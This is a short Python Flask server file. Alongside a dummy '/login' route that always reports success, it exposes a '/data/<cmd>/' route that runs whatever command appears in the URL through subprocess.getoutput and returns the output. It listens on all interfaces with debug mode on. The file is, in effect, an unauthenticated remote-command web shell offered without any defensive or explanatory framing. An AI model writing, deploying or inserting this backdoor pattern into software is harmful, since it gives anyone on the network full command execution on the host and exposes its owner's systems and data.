# coding:utf-8

from flask import Flask, jsonify
import subprocess


app = Flask(__name__)

class Config(object):
    DEBUG = True

app.config.from_object(Config)

@app.route('/login')
def login():
    data='success'
    return jsonify(data)

@app.route('/data/<cmd>/', methods=['GET', 'POST'])
def cmd_data(cmd):
    data=subprocess.getoutput(cmd)
    return jsonify(data)


app.run(host='0.0.0.0', port=12122)
